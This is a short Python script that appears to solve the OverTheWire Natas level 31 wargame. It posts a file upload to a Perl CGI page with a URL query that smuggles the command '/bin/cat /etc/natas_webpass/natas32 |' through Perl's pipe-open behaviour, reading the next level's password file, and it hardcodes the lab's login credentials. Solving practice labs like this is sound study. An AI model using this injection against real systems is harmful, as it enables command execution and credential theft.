import requests, base64

url = "http://natas31.natas.labs.overthewire.org/index.pl?/bin/cat%20/etc/natas_webpass/natas32%20|"
s = requests.Session()
s.auth=('natas31','hay7aecuungiuKaezuathuk9biin0pu1')
r=s.post(url,
         data={'submit':'submit'},
         files={'file':open('./file.txt','rb'),
                'file':('sample.csv',open('./sample.csv','rb'))})
print(r.text)
